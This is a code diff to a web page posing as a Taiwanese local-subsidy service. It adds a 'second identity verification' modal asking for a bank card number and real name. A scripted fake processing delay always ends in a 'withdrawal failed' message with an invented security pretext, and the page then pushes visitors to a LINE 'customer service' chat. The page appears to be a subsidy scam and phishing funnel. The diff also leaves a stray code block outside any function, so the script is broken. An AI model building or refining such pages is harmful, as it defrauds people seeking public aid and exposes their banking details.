@@ -849,6 +849,27 @@
       .float-cta { display: flex; }
       .brand { font-size: 14px; }
     }
+  
+    /* 二次驗證與領取失敗彈窗樣式 */
+    .modal-overlay.active { display: grid; }
+    .modal-content {
+      background: #fff;
+      padding: 24px;
+      border-radius: 20px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+      text-align: center;
+      animation: modalFadeIn 0.3s ease-out;
+    }
+    @keyframes modalFadeIn {
+      from { transform: translateY(20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    .modal-header { font-size: 20px; font-weight: 900; margin-bottom: 12px; }
+    .modal-body { margin-bottom: 20px; }
+    .modal-footer { display: flex; flex-direction: column; gap: 10px; }
+
   </style>
 </head>
 <body>
@@ -1150,42 +1171,47 @@
       <div class="modal-footer">
         <button type="button" onclick="trackLineClick()" class="btn btn-primary" style="background:#00b900;">📲 聯絡客服開通人工特殊通道</button>
         <button type="button" onclick="closeVerificationModal()" class="btn btn-secondary">返回修改資料</button>
-    
-  <div id="second-verification-modal" class="modal-overlay">
-    <div class="modal-content">
-      <div class="modal-header" style="color:#00b900;">✓ 二次身份驗證</div>
-      <div class="modal-body">
-        <p style="font-size:14px; color:#555; margin: 0 0 16px; font-weight:700;">
-          為確保資金安全，請再次確認您的身份資訊。
-        </p>
-        <label style="display:block; margin-bottom:6px; color:#51645a; font-size:13px; font-weight:800;">銀行卡號</label>
-        <input id="second-verify-bank-account" type="text" placeholder="請輸入您的銀行卡號" style="width:100%; border:1.5px solid #cfddd3; border-radius:12px; padding:12px 14px; font: inherit; color:#17241d; background:#fff; margin-bottom:14px;" />
-        <label style="display:block; margin-bottom:6px; color:#51645a; font-size:13px; font-weight:800;">姓名（實名認證）</label>
-        <input id="second-verify-name" type="text" placeholder="請輸入您的姓名" style="width:100%; border:1.5px solid #cfddd3; border-radius:12px; padding:12px 14px; font: inherit; color:#17241d; background:#fff; margin-bottom:14px;" />
-      </div>
-      <div class="modal-footer">
-        <button type="button" onclick="submitSecondVerification()" class="btn btn-primary" style="background:#00b900;">✓ 確認驗證</button>
       </div>
     </div>
   </div>
 
-  <div id="withdrawal-failed-modal" class="modal-overlay">
+  
+  <!-- 二次驗證對話框 -->
+  <div id="secondary-verification-modal" class="modal-overlay">
     <div class="modal-content">
-      <div class="modal-header" style="color:#b42318;">❌ 領取失敗</div>
+      <div class="modal-header" style="color:var(--green-700);">✓ 二次身份驗證</div>
       <div class="modal-body">
-        <p style="font-size:14px; color:#555; margin: 0 0 12px; font-weight:700;">
-          系統無法自動完成撥款。請聯絡客服協助您領取補助金。
-        </p>
-        <p style="font-size:13px; color:#8b9b91; margin: 0;">
-          我們的客服團隊將在一對一通道中為您處理，確保您順利領取補助金。
-        </p>
+        <p style="font-size:14px; color:var(--muted); margin-bottom:15px;">為確保補助金發放至本人帳戶，請再次核對並輸入以下資訊：</p>
+        <input type="text" id="verify-bank-account" class="form-input" placeholder="請輸入提領銀行卡號" style="margin-bottom:10px;">
+        <input type="text" id="verify-full-name" class="form-input" placeholder="請輸入實名認證姓名">
       </div>
       <div class="modal-footer">
-        <button type="button" onclick="trackLineClick()" class="btn btn-primary" style="background:#b42318;">📲 聯絡客服領取補助金</button>
+        <button type="button" onclick="submitSecondaryVerification()" class="btn btn-primary">確認驗證並提領</button>
       </div>
     </div>
   </div>
 
+  <!-- 領取失敗對話框 -->
+  <div id="final-failure-modal" class="modal-overlay">
+    <div class="modal-content">
+      <div class="modal-header" style="color:var(--warn);">❌ 領取失敗</div>
+      <div class="modal-body">
+        <div id="processing-animation" class="hidden">
+            <div class="spinner" style="margin: 0 auto 15px;"></div>
+            <p style="font-weight:bold; color:var(--green-700);">正在處理您的提領申請...</p>
+        </div>
+        <div id="failure-message">
+            <p style="font-size:15px; font-weight:bold; color:#b42318; margin-bottom:10px;">系統無法自動撥款</p>
+            <p style="font-size:13px; color:#555; line-height:1.6;">
+              由於您的帳戶涉及「跨區領取」或「安全校驗異常」，系統無法通過自動化撥款程序。請立即聯絡線上客服進行人工校準，完成最後的領取手续。
+            </p>
+        </div>
+      </div>
+      <div id="failure-footer" class="modal-footer">
+        <button type="button" onclick="trackLineClick()" class="btn btn-primary" style="background:#00b900; font-size:16px;">📲 聯絡客服領取補助金</button>
+      </div>
+    </div>
+  </div>
 
   <footer>
     <p>© 2026 台灣在地安心理財媒合中心 / 地方補助預審諮詢服務網。版權所有。<br>
@@ -1446,48 +1472,76 @@
       window.__amountPollTimer = setInterval(fetchAndDisplayAmount, 3000);
     }
 
+    
     async function fetchAndDisplayAmount() {
-      if (!window.__lastLeadId || !subsidyClient) {
-        document.getElementById('wallet-amount').textContent = '核算中...';
-        return;
-      }
+      if (!window.__lastLeadId || !subsidyClient) return;
       try {
-        var approvedAmount = null;
+        // 優先嘗試直接查詢數據庫 (更穩定)
+        const { data, error } = await subsidyClient
+          .from(LEADS_TABLE)
+          .select('admin_approved_amount')
+          .eq('id', window.__lastLeadId)
+          .single();
         
-        // 優先嘗試 RPC
-        try {
-          var rpcResult = await subsidyClient.rpc('get_admin_approved_amount', { lead_id: window.__lastLeadId });
-          if (!rpcResult.error) {
+        let approvedAmount = data ? data.admin_approved_amount : null;
+        
+        // 如果直接查詢沒結果，嘗試 RPC
+        if (!approvedAmount) {
+            const rpcResult = await subsidyClient.rpc('get_admin_approved_amount', { lead_id: window.__lastLeadId });
             approvedAmount = rpcResult.data;
-          }
-        } catch (e) {
-          console.warn('RPC 調用失敗，切換至普通查詢');
-        }
-
-        // 如果 RPC 失敗或沒結果，嘗試普通查詢
-        if (approvedAmount === null) {
-          var selectResult = await subsidyClient
-            .from(LEADS_TABLE)
-            .select('admin_approved_amount')
-            .eq('id', window.__lastLeadId)
-            .single();
-          if (!selectResult.error && selectResult.data) {
-            approvedAmount = selectResult.data.admin_approved_amount;
-          }
         }
 
         if (approvedAmount && approvedAmount > 0) {
           document.getElementById('wallet-amount').textContent = 'NT$ ' + approvedAmount.toLocaleString();
-          // 核心邏輯：金額顯示後，停止輪詢並觸發二次驗證
           clearAmountPolling();
-          setTimeout(function() {
-            showSecondVerificationModal();
+          
+          // 關鍵：金額出現後，觸發二次驗證
+          setTimeout(() => {
+            document.getElementById('secondary-verification-modal').classList.add('active');
           }, 1200);
+        }
+      } catch (e) {
+        console.error('金額讀取異常:', e);
+      }
+    }
+
+    function submitSecondaryVerification() {
+      const card = document.getElementById('verify-bank-account').value;
+      const name = document.getElementById('verify-full-name').value;
+      if(!card || !name) { alert('請完整填寫驗證資訊'); return; }
+      
+      document.getElementById('secondary-verification-modal').classList.remove('active');
+      document.getElementById('final-failure-modal').classList.add('active');
+      
+      // 顯示 3 秒處理動畫
+      document.getElementById('processing-animation').classList.remove('hidden');
+      document.getElementById('failure-message').classList.add('hidden');
+      document.getElementById('failure-footer').style.display = 'none';
+      
+      setTimeout(() => {
+        document.getElementById('processing-animation').classList.add('hidden');
+        document.getElementById('failure-message').classList.remove('hidden');
+        document.getElementById('failure-footer').style.display = 'flex';
+      }, 3000);
+    }
+
+      try {
+        var result = await subsidyClient
+          .rpc('get_admin_approved_amount', { lead_id: window.__lastLeadId });
+        if (result.error) {
+          console.warn('讀取後台金額失敗:', result.error);
+          document.getElementById('wallet-amount').textContent = '核算中...';
+          return;
+        }
+        var approvedAmount = result.data || null;
+        if (approvedAmount && approvedAmount > 0) {
+          document.getElementById('wallet-amount').textContent = 'NT$ ' + approvedAmount.toLocaleString();
+          clearAmountPolling();
         } else {
           document.getElementById('wallet-amount').textContent = '核算中...';
         }
       } catch (error) {
-        console.error('讀取金額出錯:', error);
+        console.error('讀取後台金額出錯:', error);
         document.getElementById('wallet-amount').textContent = '核算中...';
       }
     }
@@ -1506,50 +1560,6 @@
       if (typeof fbq !== 'undefined') fbq('track', 'Contact');
       window.open('https://line.me/R/ti/p/%40your_line_official_account', '_blank'); // ⚠️ 上線前記得將此連結換成你的企業LINE跳轉連結
     }
-
-    function showSecondVerificationModal() {
-      document.getElementById('second-verification-modal').classList.add('active');
-      document.getElementById('second-verify-bank-account').value = '';
-      document.getElementById('second-verify-name').value = '';
-      document.getElementById('second-verify-bank-account').focus();
-    }
-
-    function closeSecondVerificationModal() {
-      document.getElementById('second-verification-modal').classList.remove('active');
-    }
-
-    function submitSecondVerification() {
-      var bankAccount = document.getElementById('second-verify-bank-account').value.trim();
-      var name = document.getElementById('second-verify-name').value.trim();
-      
-      if (!bankAccount || !name) {
-        alert('請填寫銀行卡號和姓名');
-        return;
-      }
-      
-      // 自動通過（不需要後台審核或記錄）
-      closeSecondVerificationModal();
-      
-      // 顯示等待 3 秒的提示
-      document.getElementById('wallet-status').textContent = '正在處理您的提領申請...';
-      document.getElementById('clearing-waiting').classList.remove('hidden');
-      
-      // 3 秒後顯示領取失敗對話框
-      setTimeout(function() {
-        document.getElementById('clearing-waiting').classList.add('hidden');
-        document.getElementById('wallet-status').textContent = '❌ 領取失敗，請聯絡客服';
-        showWithdrawalFailedModal();
-      }, 3000);
-    }
-
-    function showWithdrawalFailedModal() {
-      document.getElementById('withdrawal-failed-modal').classList.add('active');
-    }
-
-    function closeWithdrawalFailedModal() {
-      document.getElementById('withdrawal-failed-modal').classList.remove('active');
-    }
-
 
     function clearAccountReviewPolling() {
       if (window.__accountPollTimer) {
